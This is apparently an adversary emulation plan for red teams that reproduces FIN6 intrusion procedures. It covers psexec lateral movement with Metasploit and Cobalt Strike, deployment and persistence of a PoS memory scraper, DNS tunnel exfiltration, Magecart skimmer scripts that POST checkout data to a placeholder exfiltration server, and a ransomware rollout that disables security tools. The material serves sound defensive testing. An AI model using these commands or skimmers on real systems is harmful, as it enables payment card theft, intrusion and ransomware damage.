# Phase 2 Overview

During Discovery, FIN6 identifies systems of interest.  Depending on your organization’s use case, this could be a Point of Sale (PoS) system, an E-commerce site, or hosts on which to emulate a ransomware event.  FIN6 has deployed PoS malware via popular penetration testing frameworks and executed these tools with the Windows Management Instrumentation (WMI) Command-Line Utility.  FIN6 is reported to have compromised E-commerce environments by both injecting Magecart scripts into third-party JavaScript libraries and by directly attacking web servers.  To deploy ransomware, the group copies its tools to an internal server, uses bat files for deployment, and WMI or PsExec for execution.

## Prerequisites

* You have accomplished the enabling objectives of Phase 1 (compromise, discover, and escalate), have identified your organizations use case (POS, E-commerce/web, ransomware), and are prepared to pursue Phase 2 objectives.
* Your objectives for Phase 2 are to deploy, execute, and persist an operational capability on a system of interest identified during Discovery.
* The operational capability should be deployed with the intent of assessing the liklihood of exfiltrating POS data, harvesting payment information from a web server, or deploying ransomware.

# Execution

## Scenario 1 - Attacking Point of Sale (POS) Systems

The lateral movement described herein describes lateral movement to systems of interest identified during Discovery. FIN6 has moved laterally using RDP and legitimate but compromised credentials to console into remote targets and access the system's command-line to run a PowerShell one-liner that stages either a Meterpreter payload or CobaltStrike's Beacon.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup>  The group has also made extensive use of these framework's lateral movement capabilities to expand access using built-in psexec commands.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup>  FIN6 uses lateral movement to establish a point of presence on systems of interest, prepare the environment, and deploy their operational capabilities.  

The operational capability we will be emulating for this scenario is PoS malware.  You are encouraged to use a memory scraper of your choosing.  We have opted to use [mem_scraper](https://github.com/Shellntel/scripts/blob/master/mem_scraper.ps1).  This PowerShell script continuously dumps a process's memory and subsequently scrapes it for track data.  So as to remain operationally representative (name-wise), we used PS2EXE to compile the script into Assistant32.exe.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>

Additional file names (T1036.005) used by FIN6 include:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>

```sh
logmesvc.exe, ttfmgr.exe, powershell.exe, dspsvc.exe, logmeinlauncher.exe, and POSreport.exe, PnPXAssoc.exe
```

Additional service names (T1036.004) used by FIN6 in persisting PoS malware:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>

```sh
#{AV} Management Instrumentation, BFHlpr / Base Filtering Helper, hdmsv c/ Windows Hardware Management Driver, TrueType Fonts Management Service, and LogMeInServer
```

### Procedures

#### 5.1 Lateral movement to PoS system using a Command and Control (C2) Framework.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup> <sup>[13](https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf)</sup>

Metasploit PowerShell PsExec (T1059.001, T1569.002)

##### FIN6 Procedure

```sh
msf> use exploit/windows/smb/psexec_psh
msf exploit(psexec_psh) > set SMBDomain #{Domain}
msf exploit(psexec_psh) > set rhost #{PoS system}
msf exploit(psexec_psh) > set rport #{Port}
msf exploit(psexec_psh) > set SMBPass #{Password}
msf exploit(psexec_psh) > set SMBUser #{User}
msf exploit(psexec_psh) > exploit -j
```

CobaltStrike PowerShell PsExec (T1059.001, T1569.002)

##### FIN6 Procedure

```sh
beacon> jump psexec_psh #{PoS system}
```

CobaltStrike - Remote Exec (T1059.001, T1047)

```sh
remote-exec wmi #{PoS system}
```

#### 5.2 Deploy POS implant to harvest POS data.

```sh
meterpreter>upload #{Assistant32.exe} C:\Windows\temp
```

#### 5.3 Executing the POS implant using WMIC (T1047)

##### FIN6 Procedure

```sh
wmic /node:"{PoS system}" process call create #{"executable"}
```

```sh
Example: wmic /node:"192.168.101.1" process call create "c:\windows\temp\Assistant32.exe -Proc iexplore"
```

### 5.4 Persistence <sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again)</sup>

#### Registry Run Keys (T1547.001)

##### FIN6 Procedure (T1218.001) - DLL

```sh
"C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v #{ } /t REG_SZ /d #{ } "C:\#{ },#{ } /f
```

```sh
Example: "C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Help Assistant" /t REG_SZ /d "rundll32.exe "C:\Windows\SysWOW64\0409\Assistant.dll",workerInstance" /f
```

##### Alternative Procedure - EXE

```sh
"C:\Windows\System32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Help Assistant" /t REG_SZ /d "C:\Windows\temp\Assistant32.exe" /f
```

Scheduled Task (T1053.005)

##### FIN6 Procedure (T1218.001) - DLL

```sh
"C:\Windows\System32\schtasks.exe" /create /tn #{ } /tr "rundll32.exe "C:\#{ }",#{ }" /sc #{ } /ru System
```

```sh
Example: "C:\Windows\System32\schtasks.exe" /create /tn WindowsHelpAssistant /tr "rundll32.exe "C:\Windows\SysWOW64\0409\Assistant32.dll",workerInstance" /sc onstart /ru System
```

##### Alternative Procedure - EXE

```sh
Example: "C:\Windows\System32\schtasks.exe" /create /tn WindowsHelpAssistant /tr "c:\windows\temp\Assistant32.exe" /sc onstart /ru System
```

Service Creation (T1543.003)

##### FIN6 Procedure

```sh
sc qc Windows Help Assistant binpath="c:\windows\temp\Assistant32.exe" start="auto" obj="LocalSystem"
```

#### 5.5 - PoS data exfiltration over DNS tunnel (T1048.003) <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>

##### Alternative Procedure

dnscat2 Server

```sh
ruby dnscat2.rb --dns="domain=#{ }" --no cache
```

```sh
Example: ruby dnscat2.rb --dns="domain=example.com" --no cache
```

dnscat2 PowerShell Client

```sh
Start-Dnscat2 -Domain #{dnscat2 server} Exec cmd
```

---

## Scenario 2 - Attacking E-Commerce Platforms

FIN6 is suspected of being responsible for the Magecart Group 6 activity.<sup>[10](https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/)</sup>  Magecart Group 6 is responsible for targeting high-volume E-commerce sites and exfiltrating payment data to an infrastructure that mimics that of the victim.  The group had a great deal of success in injecting Magecart scripts into legitimate 3rd party JavaScript libraries, thereby compromising the check-out process for thousands of E-commerce companies.<sup>[10](https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/)</sup>  FIN6 is also suspected of accomplishing enabling objectives in order to move laterally throughout an organization with the intent of gaining access to web servers.<sup>[13](https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf)</sup>  Once on a web server, the group modifies libraries to include custom Magecart scripts.

### Procedures

#### 6.1 Lateral Movement Using C2 Frameworks<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup>

Metasploit PowerShell PsExec (T1059.001, T1569.002)

##### FIN6 Procedure

```sh
msf> use exploit/windows/smb/psexec_psh
msf exploit(psexec_psh) > set SMBDomain #{Domain}
msf exploit(psexec_psh) > set rhost #{Web Server}
msf exploit(psexec_psh) > set rport #{Port}
msf exploit(psexec_psh) > set SMBPass #{Password}
msf exploit(psexec_psh) > set SMBUser #{User}
msf exploit(psexec_psh) > exploit -j
```

CobaltStrike PowerShell PsExec (T1059.001, T1569.002)

##### FIN6 Procedure

```sh
beacon> jump psexec_psh #{Web Server}
```

CobaltStrike Remote Exec (T1059.001, T1047)

```sh
remote-exec wmi #{Web Server}
```

#### 6.2 Injection/Modification

FIN6 is suspected of compromising the web server responsible for hosting British Airways and modifying a JavaScript library to include the customized script detailed below.

##### British Airways<sup>[14](https://riskiq.com/blog/labs/magecart-british-airways-breach/)</sup>

```sh
window.onload = function() {
    jquery("#submitButton").bind("mouse touchend", function(a){
        var
            n = {};
        jQuery("#paymentForm").serializeArray().map(function(a){
            n[a.name] = a.value
        });
        var e = document.getElementById("personPaying").innerHTML;
        n.person = e;
        var
            t = JSON.stringify(n);
        setTimeout(function(){
            jQuery.ajax({
                type: "POST",
                async: !0,
                url:"#{MaliciousExfilServer.com}",
                data: t,
                dataType: "application/json"
            })
        },  500)
    })
};
```

FIN6 is suspected of operating in a similar manner against Newegg.  The web server was compromised and the following script was integrated into the checkout process on the Newegg payment processing page.

##### Newegg<sup>[15](https://riskiq.com/blog/labs/magecart-newegg/)</sup>

```sh
window.onload = function(){
    jQuery('#btnCreditCard.paymentBtn.creditcard').bind("mouseup touchend", function(e){
        var dati = jQuery('#checkout');
        var pdati = JSON.stringify(dati.serializeArray());
        setTimeout(function() {
            JQuery.ajax({
                type: "POST",
                async: true,
                url: "#{MaliciousExfilServer.com}",
                data: pdati,
                dataType: 'application/json'
            });
        },  250);
    });
};
```

---

## Scenario 3 - Deploying Ransomware

For organizations interested in emulating FIN6’s use of ransomware, the group is believed to have compromised and configured internal servers as distribution nodes.  Ransomware was hosted on these "deployment servers" with a BAT file (kill.bat) to disable security products and prepare hosts for compromise.  Additional BAT files were used to distribute both the ransomware and kill.bat.  These files were then executed by way of WMIC or PsExec.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[12](https://fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>

You are encouraged to use a ransomware simulator of your choosing.  We have opted to use [SimulateRansomware](https://github.com/BlackBox-CSP/SimulateRansomware).  This simple PowerShell script creates an "EncryptionTest" directory in My Documents PATH, creates 2 files, and writes random ASCII characters to simulate file open/close.  So as to remain operationally representative (name-wise), we used PS2EXE to compile the script into sss.exe.<sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>

### Procedures

#### 7.1 Copy kill script (kill.bat/windows.bat), distribution script (xaa.bat, xab.bat, xac.bat, etc.), and ransomware (sss.exe) to the distribution server.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>

Strings from xaa.bat:

```sh
wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
```

Kill.bat disables security products and alters firewall configs using binaries native to Windows.  (T1562.001, T1562.004)
Strings from kill.bat:

```sh
net stop #{ }

sc config #{ } start=disabled

taskkill /IM #{ } /F

netsh #{ }
```

Copy the ransomware to the distribution server.

##### FIN6 Procedure

```sh
copy sss.exe \\#{Distribution Server}\c$\windows\temp\
```

Copy the distribution scripts to the distribution server.

##### FIN6 Procedure

```sh
copy xaa.bat \\#{Distribution Server}\c$\windows\temp\
```

Copy the kill script to the distribution server.

##### FIN6 Procedure

```sh
copy windows.bat \\#{Distribution Server}\c$\windows\temp\

copy kill.bat \\#{Distribution Server}\c$\windows\temp\
```

#### 7.2 Distribute the ransomware and kill script to the intended targets.<sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>

xaa.bat

##### FIN6 Procedure

```sh
wmic /node:#{internal IP} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
```

##### FIN6 Procedure

```sh
wmic /node:#{internal IP} /user:#{"domain\username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\windows.bat or kill.bat c:\windows\temp\"
```

#### 7.3 Execute the kill script and then the ransomware.<sup>[12](https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html)</sup>

#### WMIC (T1047)

Kill Script

##### FIN6 Procedure

```sh
wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password" } process call create "cmd /c c:\windows\temp\windows.bat" or "kill.bat"
```

Ransomware

##### FIN6 Procedure

```sh
wmic /node:#{Ransomware recipient} /user:#{"domain\username"} /password:#{"password" } process call create "cmd /c c:\windows\temp\sss.exe"
```

#### PsExec

FIN6 has used the -r option to change the default remote service name in order to avoid detection.  The group is believed to have named the remote services "mstdc" or "rtrsd."<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup>  The command below authenticates over SMB, executes a command or binary, and returns the results locally.

Kill Script

##### FIN6 Procedure

```sh
psexec.exe \\#{internal IP} -u #{"domain\username"} -p #{"password"} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.bat or kill.bat
```

Ransomware

##### FIN6 Procedure

```sh
psexec.exe \\#{internal IP} -u #{"domain\username"} -p #{"password"} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
```
